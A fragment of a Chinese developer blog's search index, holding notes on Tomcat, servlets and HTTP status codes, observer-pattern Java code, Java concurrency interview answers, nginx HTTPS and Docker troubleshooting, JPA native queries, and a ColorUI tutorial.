d. 安全性： 3. 响应状态码： 200： 成功 302： 重定向 304： 资源有缓存； 404： 资源未找到（请求路径有误） 500： 服务器内部错误（java代码有误） 4 综合案例-Tomcat的具体应用 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:11:4","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"4.1 静态资源案例-门户类网站的部署和访问 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:12:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"4.1.1 案例介绍 需求： ​ 在浏览器中输入地址，访问静态HTML页面。 细节说明： ​ 把HTML和CSS课程中制作的页面加入到JavaWeb工程中，在Tomcat中部署工程，然后启动Tomcat服务器，并使用浏览器访问。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:12:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"4.1.2 实现步骤 第一步：创建工程并选择使用的Tomcat版本 第二步：拷贝资源到工程的web目录中 第三步：在web.xml中配置默认主页 第四步：部署工程到Tomcat服务器 第五步：测试浏览器访问 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:12:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"4.2 动态资源的案例-学生管理系统的部署和访问 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:13:0","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"4.2.1 案例介绍 需求： ​ 把JavaSE进阶阶段的学生管理系统的服务器改用Tomcat实现。 细节说明： ​ 把学生管理系统涉及的HTML和样式以及图片文件拷贝到JavaWeb工程中，在Tomcat中部署工程，然后启动Tomcat服务器，并使用浏览器访问。 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:13:1","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"4.2.2 实现步骤 第一步：创建工程 第二步：拷贝资源 第三步：配置默认主页 第四步：部署项目 注意细节： 注意在idea中的tomcat的配置中添加虚拟访问路径： /crm ","date":"2021-07-17","objectID":"/posts/tomcathttp/:13:2","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"4.3.2 创建案例中的动态资源-Servlet 1） Servlet简介 Servlet翻译成中文是服务端脚本，它是SUN公司推出的一套规范，称为Servlet规范。Servlet规范是JavaEE规范中的一部分。我们可以通过查阅JavaEE规范的API来了解Servlet的基本概念。通过点击JavaEE8官方文档，就可以看到关于Servlet的内容介绍。 servlet是 运行在客户端和服务器端的一个小程序！ JDK只定义接口规范，并没有实现； 具体的实现在服务器tomcat中！ 2） 按步骤编写Servlet 前期准备：在IDEA创建Javaweb工程 第一步：编写一个普通类实现Servlet接口或者继承GenericServlet类或者继承HttpServlet 第二步：重写service方法，输出一句话 第三步：在web.xml配置Servlet 第四步：启动tomcat服务器测试 在地址栏输入：http://localhost:8585/crm/studentServlet 测试访问结果 3）测试访问 ","date":"2021-07-17","objectID":"/posts/tomcathttp/:13:3","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["大三下实训笔记"],"content":"小结： 1. servlet的实现步骤： 2.servlet的执行顺序 注意： 两种配置以后使用一种即可 （自己选择） 方式1：注解形式： 方式2：web.xml形式： 【今日总结：】 0.web模块说明及tomcat配置： 1. 请求分成几部分： 1. 请求行 ---- get www.baidu.com 2. 请求头 ---- 很多信息（后面具体使用，展开讲解） 3. 请求空行 ----- 什么都没有（空白） 4. 请求体 ----- （get没有请求体， post有请求体） 响应分成几部分： ​ 同上，4部分 2. get和post的区别： 参数的位置不同 是否有请求体 相对安全性 参数的长度： （post参数可以传递更多） 3. 响应状态码： 200 代表成功 302 重定向 304 代表浏览器缓存（此请求没有真正访问资源） 404 请求路径有误（资源访问不到） 500 后台服务器内部错误（java程序有异常） 【今日作业安排】 完成tomcat的安装（能正常启动，并访问看到tomcat猫） 能够说清楚tomcat解压文件夹下的常用的5个分别是什么？ 能够将idea集成tomcat； 写下常见的响应状态码，及其含义； 能够部署静态页面项目 （参考4.1） 尝试完成补充的登录案例； ==预习servlet== 【补充】 1.实现不重启tomcat，修改页面立即生效： 2.index的特殊含义： 在web项目中， index名字是有特殊含义的（代表首页） 访问到包含有index名的网页时， 不用补全路径的！ 优先级 .html \u003e .jsp 3.在案例1的基础上，实现登录功能： /** * servlet快速入门： * 1. 实现servlet接口； * 2. 重写方法； * 3. 配置servlet * xml配置： * 注解配置: @WebServlet(\"/userServlet\") * * * 用户登录的servlet： * 1.可以在service方法中，接收用户提交的用户名和密码； * 2.判断用户名和密码是否正确； * 3.如果正确，提示登录成功， * 如果不正确，提示登录失败； */ @WebServlet(\"/userLoginServlet\") public class UserLoginServlet implements Servlet{ /** 1.service方法何时执行？ --- 每次访问servlet时，service方法都会执行！ 2.service方法中如何获取请求的参数？ --- request.getparameter(\"参数名\") */ @Override public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException { // 0.指定字符集，防止乱码： response.setContentType(\"text/html;charset=utf-8\"); System.out.println(\"----------------------servlet的service方法执行了 ......\"); // 1.获取请求的参数： //获取用户名： String username = request.getParameter(\"username\"); //获取密码： String password = request.getParameter(\"password\"); System.out.println(\"------------用户提交的用户名为：\" +username); System.out.println(\"------------用户提交的密码为：\" + password); // 2.判断用户名和密码是否正确； --------以后可以去数据库查询用户名和密码是否正确！ （目前写死） if (\"lisi\".equals(username) \u0026\u0026 \"123456\".equals(password)){ //登录成功 System.out.println(\"-----------登录成功~~~\"); // 3.1 成功： response.getWriter().write(\"欢迎\"+username+\", 登录成功！ \"); }else { // 登录失败 System.out.println(\"-----------登录失败~~~\"); // 3.2 失败： response.getWriter().write(\"您的用户名密码有误，请重新输入!\"); } } ccleaner // ==========其他4个方法，明","date":"2021-07-17","objectID":"/posts/tomcathttp/:13:4","tags":[],"title":"Tomcat\u0026Http","uri":"/posts/tomcathttp/"},{"categories":["设计模式"],"content":"模式动机 软件系统：一个对象的状态或行为的变化将导致其他对象的状态或行为也发生改变，它们之间将产生联动 观察者模式： ​ 定义了对象之间一种一对多的依赖关系，让一个对象的改变能够影响其他对象发生改变的对象称为观察目标， ​ 被通知的对象称为观察者 ​ 一个观察目标可以对应多个观察者 ","date":"2021-05-28","objectID":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/:1:0","tags":["观察者模式"],"title":"观察者模式","uri":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 观察者模式(Observer Pattern)：定义对象间的一种一对多依赖关系，使得每当一个对象状态发生改变时，其相关依赖对象皆得到通知并被自动更新。 观察者模式又叫做发布-订阅（Publish/Subscribe）模式、模型-视图（Model/View）模式、源-监听器（Source/Listener）模式或从属者（Dependents）模式 观察者模式是一种对象行为型模式 代码： //抽象观察者 public interface Observer { public void update(Subject subject); } public class ConcreteObserver implements Observer { private String observername; //观察者名称 private String observerstate; //观察者状态 public ConcreteObserver(String observername) { this.observername = observername; } @Override public void update(Subject subject) { // TODO Auto-generated method stub observerstate=\"观察者 \"+observername+\" 的当前状态是：\"+subject.getState(); System.out.println(observerstate); } } //抽象观察目标 public abstract class Subject { private String state; //状态 protected ArrayList observers=new ArrayList(); //观察者集合 public String getState() { return state; } public void setState(String state) { this.state = state; System.out.println(\"观察目标的状态变为：\"+state); } public void attach(Observer observer) { observers.add(observer); } public void detach(Observer observer) { observers.remove(observer); } public abstract void notifyObservers(); } public class ConcreteSubject extends Subject { @Override public void notifyObservers() { // TODO Auto-generated method stub System.out.println(\"具体观察目标：通知所有观察者\"); for(Object obj:observers) { Observer observer=(Observer)obj; observer.update(this); } } } public class Client { public static void main(String[] args) { // TODO Auto-generated method stub Subject subject=new ConcreteSubject(); Observer obsA=new ConcreteObserver(\"obsA\"); Observer obsB=new ConcreteObserver(\"obsB\"); subject.attach(obsA); subject.attach(obsB); System.out.println(\"--------------------\"); subject.setState(\"״̬1\"); subject.notifyObservers(); System.out.println(\"--------------------\"); subject.setState(\"״̬2\"); subject.notifyObservers(); System.out.println(\"--------------------\"); Observer obsC=new ConcreteObserver(\"obsC\"); subject.attach(obsC); subject.setState(\"״̬3\"); subject.notifyObservers(); System.out","date":"2021-05-28","objectID":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/:2:0","tags":["观察者模式"],"title":"观察者模式","uri":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 有时候在具体观察者类ConcreteObserver中需要使用到具体目标类ConcreteSubject中的状态（属性），会存在关联或依赖关系 如果在具体层之间具有关联关系，系统的扩展性将受到一定的影响，增加新的具体目标类有时候需要修改原有观察者的代码，在一定程度上违背了开闭原则，但是如果原有观察者类无须关联新增的具体目标，则系统扩展性不受影响 ","date":"2021-05-28","objectID":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/:3:0","tags":["观察者模式"],"title":"观察者模式","uri":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 可以实现表示层和数据逻辑层的分离 在观察目标和观察者之间建立一个抽象的耦合 支持广播通信，简化了一对多系统设计的难度 符合开闭原则，增加新的具体观察者无须修改原有系统代码，在具体观察者与观察目标之间不存在关联关系的情况下，增加新的观察目标也很方便 ","date":"2021-05-28","objectID":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/:4:0","tags":["观察者模式"],"title":"观察者模式","uri":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 将所有的观察者都通知到会花费很多时间 如果存在循环依赖时可能导致系统崩溃 没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而只是知道观察目标发生了变化 ","date":"2021-05-28","objectID":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/:5:0","tags":["观察者模式"],"title":"观察者模式","uri":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 一个抽象模型有两个方面，其中一个方面依赖于另一个方面，将这两个方面封装在独立的对象中使它们可以各自独立地改变和复用 一个对象的改变将导致一个或多个其他对象发生改变，且并不知道具体有多少对象将发生改变，也不知道这些对象是谁 需要在系统中创建一个触发链 ","date":"2021-05-28","objectID":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/:6:0","tags":["观察者模式"],"title":"观察者模式","uri":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"实例： 假设猫是老鼠和狗的观察目标，老鼠和狗是观察者，猫叫老鼠跑，狗也跟着叫，使用观察者模式描述该过程。 抽象目标类 import java.util.ArrayList; public abstract class Subject { protected ArrayList observers=new ArrayList(); //观察者集合 protected String subjectState; //观察目标自身的状态 public String getSubjectState() { return subjectState; } public void setSubjectState(String subjectState) { this.subjectState = subjectState; } public abstract void attach(Observer obs); //添加一个观察者 public abstract void detach(Observer obs); //删除一个观察者 public void notifyObservers() //通知所有观察者 { for(Object obs:observers) { ((Observer)obs).update(this); } } } 具体目标类 public class ConcreteSubject extends Subject { @Override public void attach(Observer obs) { //添加观察者 // TODO Auto-generated method stub observers.add(obs); } @Override public void detach(Observer obs) { //删除观察者 // TODO Auto-generated method stub observers.remove(obs); } } 抽象观察者类： //抽象观察者 public interface Observer { //更新观察者当前自身的状态 public void update(Subject subject); } 具体观察者1类： public class ConcreteObserver1 implements Observer { private String observerState=\"\"; @Override public void update(Subject subject) { // TODO Auto-generated method stub observerState=subject.getSubjectState(); System.out.println(\"观察者1当前状态：\"+observerState); } } 抽象观察者2类： public class ConcreteObserver2 implements Observer { private String observerState=\"\"; @Override public void update(Subject subject) { // TODO Auto-generated method stub observerState=subject.getSubjectState(); System.out.println(\"观察者2当前状态：\"+observerState); } } 客户端类： public class Client { public static void main(String[] args) { // TODO Auto-generated method stub Subject cs=new ConcreteSubject(); cs.setSubjectState(\"状态1\"); ConcreteObserver1 obs1=new ConcreteObserver1(); ConcreteObserver2 obs2=new ConcreteObserver2(); cs.attach(obs1); cs.attach(obs2); System.out.println(\"观察目标初始状态：\"+cs.getSubjectState()); System.out.println(\"其它观察者的状态：\"); cs.notifyObservers(); System.out.println(\"-------------------\"); cs.setSubjectState(\"状态2\"); System.out.println(\"观察目标更新后状态：\"+cs.ge","date":"2021-05-28","objectID":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/:7:0","tags":["观察者模式"],"title":"观察者模式","uri":"/posts/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["java"],"content":"Java如何开启线程？怎么保证线程安全？ 线程与进程的区别：进程是操作系统进行资源分配的最小单元，线程是操作系统进行任务分配的最小单元，线程隶属于进程。 如何开启线程？ 基础Thread类，重写run方法(start方法开启线程内部调用run、如果直接调用run就是方法的调用，不会开启线程) 实现Runable接口，实现run方法() 实现Callable接口，实现call方法，通过FutureTask创建一个线程，获取到线程的返回结果， 通过线程池开启线程 如何保证线程安全？（多个线程对同一个资源进行操作）加锁 JVM提供的锁，也就是Synchronized关键字， JDK提供的各种锁LOCK ","date":"2021-05-25","objectID":"/posts/java%E5%B9%B6%E5%8F%91/:1:0","tags":["面试"],"title":"Java并发","uri":"/posts/java%E5%B9%B6%E5%8F%91/"},{"categories":["java"],"content":"Volatile与Synchronized有什么区别？Volatile能不能保证线程安全？DCL（Double Check Lock）单例为什么要加Volatile？ DCL: Synchronized关键字用来加锁，Volatile只是保持变量的线程可见性，通常适用于一个线程写，多个线程读的场景 不能。Volatile只能保证线程可见性，不能保证原子性， Volatile防止指令重排（Integer i=8 1、分配内存，2、对象初始化、3、建立指针）防止高并发状态下，指令重排造成线程安全问题。 ","date":"2021-05-25","objectID":"/posts/java%E5%B9%B6%E5%8F%91/:1:1","tags":["面试"],"title":"Java并发","uri":"/posts/java%E5%B9%B6%E5%8F%91/"},{"categories":["java"],"content":"java线程锁机制是怎样的，偏向锁、轻量级锁、重量级锁有什么区别？锁机制是如何升级的？ Java的锁机制就是在对象的Markword中记录一个锁的状态，偏向锁、轻量级锁、重量级锁对应不同的锁标志位状态 Java的锁机制就是根据资源竞争的激烈程度不断进行锁升级的过程。 ","date":"2021-05-25","objectID":"/posts/java%E5%B9%B6%E5%8F%91/:1:2","tags":["面试"],"title":"Java并发","uri":"/posts/java%E5%B9%B6%E5%8F%91/"},{"categories":["java"],"content":"谈谈你对AQS的理解，AQS如何实现可重入锁？ AQS（AbstractQueueSynchronizer）是一个Java线程同步的框架，是JDK中许多锁工具的核心实现框架。 在AQS中，维护了一个信号量state和一个线程组成的双向链表队列，其中，这个线程队列是用来给线程排队的，state就是一个信号量，用来控制线程排队或者放行的。在不同的场景下有不同的定义 。 在可重入锁这个场景下，state就用来表示加锁的次数，0表示无锁，每加一次锁，state+1，释放锁-1 ","date":"2021-05-25","objectID":"/posts/java%E5%B9%B6%E5%8F%91/:1:3","tags":["面试"],"title":"Java并发","uri":"/posts/java%E5%B9%B6%E5%8F%91/"},{"categories":["运维"],"content":"一个绿色的小标志","date":"2021-05-20","objectID":"/posts/https%E9%85%8D%E7%BD%AE/","tags":["nginx"],"title":"Https配置","uri":"/posts/https%E9%85%8D%E7%BD%AE/"},{"categories":["运维"],"content":"第一步：Nginx的ssl模块安装 在配置ssl证书之前，要确保你的nginx已经安装了ssl模块，一般情况下自己安装的nginx都是不存在ssl模块的。 这里先检查下自己是否存在ssl模块： 进入到你的nginx安装目录下面，我的目录是在（/usr/local/nginx），如果你的nginx安装步骤和上面的文章一致的话，那你的目录和我应该是一致的 进入到目录的sbin目录下，输入 #注意这里是大写的V，小写的只显示版本号 ./nginx -V 如果出现 (configure arguments: –with-http_ssl_module), 则已安装（下面的步骤可以跳过，直接进行第二步）。 一般情况下都是不存在ssl模块的，接下来进入到你的解压缩后的nginx目录，注意这里不是nginx安装目录，是解压缩后的目录，我的是在（/root/nginx），进入目录后，输入 ./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module 接下来执行 make #切记不要执行make install，否则会重新安装nginx 上述操作执行完成以后，你的目录下会出现objs文件夹，文件夹内存在nginx文件，如图： 接下来使用新的nginx文件替换掉之前安装目录sbin下的nginx，注意这里的替换的时候可以先将之前的文件备份下，停掉nginx服务 ./nginx -s stop #停止nginx服务 #替换之前的nginx cp /root/nginx/objs/nginx /usr/local/nginx/sbin 成功之后，进入到nginx安装目录下，查看ssl时候成功 #注意这里是大写的V，小写的只显示版本号 ./nginx -V #可以看到这里出现了configure arguments: --with-http_ssl_module 证明已经安装成功 提示：这里替换后在执行 -V命令如果提示权限不足，先给这个nginx文件提升下权限 我是用的是finalshell连接工具，直接右键就可以修改权限了，当然，也可以通过指令修改，如下： chmod 111 nginx ","date":"2021-05-20","objectID":"/posts/https%E9%85%8D%E7%BD%AE/:1:0","tags":["nginx"],"title":"Https配置","uri":"/posts/https%E9%85%8D%E7%BD%AE/"},{"categories":["运维"],"content":"第二步：配置ssl证书 解压缩下载好的证书（证书一般是pem文件和key文件，这里名字可以随便改） 将下载好的证书上上传到服务器，我将证书放在了root目录下的card文件夹 #在root目录下创建card文件夹 cd /root mkdir card ","date":"2021-05-20","objectID":"/posts/https%E9%85%8D%E7%BD%AE/:2:0","tags":["nginx"],"title":"Https配置","uri":"/posts/https%E9%85%8D%E7%BD%AE/"},{"categories":["运维"],"content":"第三步：进行nginx.conf配置 进入nginx.conf文件下 cd /usr/locla/nginx/conf #修改nginx.conf文件 vim nginx.conf 打开之后文件内容如图 可以将没用的东西都删除掉，删除的时候注意，括号要对应起来。 然后进行配置，输入： user nginx; worker_processes 1; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; server { #监听443端口 listen 443 ssl; #你的域名 server_name wchat.eccentric.top; #ssl证书的pem文件路径 ssl_certificate /etc/nginx/cart/5663981_wchat.eccentric.top.pem; #ssl证书的key文件路径 ssl_certificate_key /etc/nginx/cart/5663981_wchat.eccentric.top.key; location / { proxy_pass http://120.77.216.116:9981; } } server { listen 80; server_name wchat.eccentric.top; #将请求转成https rewrite ^(.*)$ https://$host$1 permanent; } } 注意：这里需要在安全组中开放443端口。 ","date":"2021-05-20","objectID":"/posts/https%E9%85%8D%E7%BD%AE/:3:0","tags":["nginx"],"title":"Https配置","uri":"/posts/https%E9%85%8D%E7%BD%AE/"},{"categories":["运维"],"content":"第四步：重启nginx ok，如果上述步骤都完成了，没有问题，接下来只需要重启nginx服务即可。 进入sbin目录下，输入 ./nginx -s reload ./nginx -s stop ./nginx ps： docker安装nginx配置反向代理，一定要映射80和443端口； 服务器安全组开放80和443端口； docker或者nginx配置完要重启 ","date":"2021-05-20","objectID":"/posts/https%E9%85%8D%E7%BD%AE/:4:0","tags":["nginx"],"title":"Https配置","uri":"/posts/https%E9%85%8D%E7%BD%AE/"},{"categories":["运维"],"content":"nginx启动报错 docker run --name postNginx -v /work/html:/usr/share/nginx/html -v /work/nginx:/etc/nginx nginx 2021/05/19 14:46:05 [emerg] 1#1: open() “/etc/nginx/nginx.conf” failed (2: No such file or directory) nginx: [emerg] open() “/etc/nginx/nginx.conf” failed (2: No such file or directory) 意思是没有找到/etc/nginx/nginx.conf文件， 第一种解决办法： docker run --name=mynginx -p 80:80 -p 443:443 \\ --restart=always \\ -v /work/nginx/nginx.conf:/etc/nginx/nginx.conf \\ -v /work/nginx/conf.d:/etc/nginx/conf.d \\ -v /work/nginx/www:/usr/share/nginx/html \\ -v /work/nginx/logs:/var/log/nginx -v /work/nginx/cart:/etc/nginx/cart \\ -d nginx 第二种解决办法： ​ 都提示了是没有权限造成的，那就排查下权限。看看宿主机本地的nginx.conf对other用户是否有读权限，再排查下该配置文件的所有父级目录是否有访问权限。或者像一楼说的用docker run --privileged=true启动容器，这样就是使用root用户权限了。 ","date":"2021-05-19","objectID":"/posts/%E6%97%A5%E5%B8%B8%E6%8E%89%E5%9D%91/:0:1","tags":["docker 掉坑"],"title":"日常掉坑","uri":"/posts/%E6%97%A5%E5%B8%B8%E6%8E%89%E5%9D%91/"},{"categories":["运维"],"content":"nginx代理转发错误 connect() failed (111: Connection refused) while connecting to upstream, client: 202.114.144.231, server: 111.47.28.118, request: \"POST /prd-api/authorization-server/oauth/token?username=admin\u0026password=password\u0026grant_type=password\u0026scope=read HTTP/1.1\", upstream: \"http://111.47.28.118:7181/authorization-server/oauth/token?username=admin\u0026password=password\u0026grant_type=password\u0026scope=read\", host: \"111.47.28.118:7191\", referrer: \"http://111.47.28.118:7191/\" 202.114.144.231 - test_client [10/Jun/2021:09:53:55 +0000] \"POST /prd-api/authorization-server/oauth/token?username=admin\u0026password=password\u0026grant_type=password\u0026scope=read HTTP/1.1\" 502 494 \"http://111.47.28.118:7191/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41\" \"-\" 目前nginx配置文件 server { listen 80; listen [::]:80; server_name 111.47.28.118; #access_log /var/log/nginx/host.access.log main; location / { root /usr/share/nginx/html/AAMS; index index.html index.htm; } location /prd-api { rewrite ^/prd-api/(.*)$ /$1 break; proxy_pass http://111.47.28.118:7181; proxy_set_header Authorization $http_authorization; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } } nginx.conf配置： user nginx; worker_processes auto; error_log /var/log/nginx/error.log notice; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; underscores_in_headers on; add_header Access-Control-Allow-Headers Authorization; include /etc/nginx/conf.d/*.conf; } 解决：","date":"2021-05-19","objectID":"/posts/%E6%97%A5%E5%B8%B8%E6%8E%89%E5%9D%91/:0:2","tags":["docker 掉坑"],"title":"日常掉坑","uri":"/posts/%E6%97%A5%E5%B8%B8%E6%8E%89%E5%9D%91/"},{"categories":["数据库"],"content":"JPA 基本查询 Spring Data JPA提供的一个查询规范，查询语句关键字，简单的SQL可根据方法命名来即可，省略了写sql语句 关键字 方法命名 sql where字句 And findByNameAndPwd where name= ? and pwd =? Or findByNameOrSex where name= ? or sex=? Is,Equals findById,findByIdEquals where id= ? Between findByIdBetween where id between ? and ? LessThan findByIdLessThan where id \u003c ? LessThanEquals findByIdLessThanEquals where id \u003c= ? GreaterThan findByIdGreaterThan where id \u003e ? GreaterThanEquals findByIdGreaterThanEquals where id \u003e = ? After findByIdAfter where id \u003e ? Before findByIdBefore where id \u003c ? IsNull findByNameIsNull where name is null isNotNull,NotNull findByNameNotNull where name is not null Like findByNameLike where name like ? NotLike findByNameNotLike where name not like ? StartingWith findByNameStartingWith where name like ‘?%’ EndingWith findByNameEndingWith where name like ‘%?’ Containing findByNameContaining where name like ‘%?%’ OrderBy findByIdOrderByXDesc where id=? order by x desc Not findByNameNot where name \u003c\u003e ? In findByIdIn(Collection\u003c?\u003e c) where id in (?) NotIn findByIdNotIn(Collection\u003c?\u003e c) where id not in (?) True findByAaaTue where aaa = true False findByAaaFalse where aaa = false IgnoreCase findByNameIgnoreCase where UPPER(name)=UPPER(?) ","date":"2021-05-15","objectID":"/posts/jpa%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81sql/:1:0","tags":["JPA"],"title":"JPA实现动态SQL","uri":"/posts/jpa%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81sql/"},{"categories":["数据库"],"content":"JPA 多条件查询（参数为空判断）语句 工作中遇到一个多条件查询的需求，需要根据名字，性别，年龄以及序号查询数据，名字需要模糊查询，参数有可能为空。 @Query(value = \"select * from people where if(?1 !='',name like concat('%',?1,'%'),1=1) and if(?2 !='',sex=?2,1=1)\"+ \" and if(IFNULL(?3,'') !='',age=?3,1=1) and if(IFNULL(?4,'') !='',num=?4,1=1) \",nativeQuery = true) List\u003cPeople\u003e find(String name,String sex,Integer age,Integer num); 同理： @Query(value = \"select * from post_timer where if(IFNULL(?1,'') !='',is_send=?1,1=1) and if(IFNULL(?2,'') !='',typa=?2,1=1) and if(IFNULL(?3,'') !='',status=?3,1=1) and if(?4 !='',content like concat('%',?4,'%'),1=1) \"+ \"order by create_time DESC limit ?5,?6\",nativeQuery = true) List\u003cPostTimer\u003e findlike(Integer isSend,Integer typa,Integer status,String likeString,Integer page,Integer limit); @Query(value = \"select count(*) from post_timer where if(IFNULL(?1,'') !='',is_send=?1,1=1) and if(IFNULL(?2,'') !='',typa=?2,1=1) and if(IFNULL(?3,'') !='',status=?3,1=1) and if(?4 !='',content like concat('%',?4,'%'),1=1) \",nativeQuery = true) Integer countlike(Integer isSend,Integer typa,Integer status,String likeString); PS： nativeQuery = true 的含义是使用原生SQL，即注解中的SQL语句会生效，false的话就不会生效。 SQL语句中 ?1、?2、?3、?4 的意思是代表方法中的第几个参数。 SQL中模糊查询的写法为 like concat(’%’, ?1, ‘%’) if(?1 !=’’,name like concat(’%’,?1,’%’),1=1) 代表传入的参数name如果不为\"\"（Spring类型空是\"“而不是null）将参数传入name，如果为空时显示1=1 代表参数为真，对查询结果不产生作用。IF 的语法满足mysql的基本语法，IF(expr1,expr2,expr3)， 如果 expr1 为真(expr1 \u003c\u003e 0 以及 expr1 \u003c\u003e NULL)，那么 IF() 返回 expr2，否则返回expr3 if(IFNULL(?3,’’) !=’’,age=?3,1=1) 表示如果传入的年龄是null，则替换成空字符串，然后判断是否为空，不为空则将参数传入age，否则忽略不对查询结果产生影响。IFNULL 是mysql中的一个函数，这个函数一般用来替换 NULL 值的。IFNULL(value1,value2)，判断value1是否为null，如果为null则用value2替换。 **参数定义时，定义数值，应使用Integer，**如果用int定义，当入参为NULL时，程序会报空指针错误。原因是JAVA 中 int 是值类型，非对象，不可以设置为 NULL，integer 是对象类型，可以设置为NULL ","date":"2021-05-15","objectID":"/posts/jpa%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81sql/:2:0","tags":["JPA"],"title":"JPA实现动态SQL","uri":"/posts/jpa%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81sql/"},{"categories":["前端"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net 本教程配合官方示例食用更佳！！！ 目录 [TOC] 前言 ColorUI是一个css库！！！在你引入样式后可以根据class来调用组件 快速上手 ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:0:0","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"使用UniApp开发 ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:1:0","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"开始 下载源码解压获得/Colorui-UniApp文件夹，复制目录下的 /colorui 文件夹到你的项目根目录 App.vue 引入关键Css main.css icon.css \u003cstyle\u003e @import \"colorui/main.css\"; @import \"colorui/icon.css\"; @import \"app.css\"; /* 你的项目css */ .... \u003c/style\u003e ","date":"2021-05-12","objectID":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/:1:1","tags":["ColorUI"],"title":"ColorUI简易教程","uri":"/posts/colorui%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/"},{"categories":["前端"],"content":"使用自定义导航栏 导航栏作为常用组件有做简单封装，当然你也可以直接复制代码结构自己修改，达到个性化目的。 App.vue 获得系统信息 onLaunch: function() { uni.getSystemInfo({ success: function(e) { // #ifndef MP Vue.prototype.StatusBar = e.statusBarHeight; if (e.platform == 'android') { Vue.prototype.CustomBar = e.statusBarHeight + 50; } else { Vue.prototype.CustomBar = e.statusBarHeight + 45; }; // #endif // #ifdef MP-WEIXIN Vue.prototype.StatusBar = e.statusBarHeight; let custom = wx.getMenuButtonBoundingClientRect(); Vue.prototype.Custom = custom; Vue.prototype.CustomBar = custom.bottom + custom.top - e.statusBarHeight; // #endif // #ifdef MP-ALIPAY Vue.prototype.StatusBar = e.statusBarHeight; Vue.prototype.CustomBar = e.statusBarHeight + e.titleBarHeight; // #endif } }) }, pages.json 配置取消系统导航栏 \"globalStyle\": { \"navigationStyle\": \"custom\" }, 复制代码结构可以直接使用，注意全局变量的获取。 使用封装,在main.js 引入 cu-custom 组件。 import cuCustom 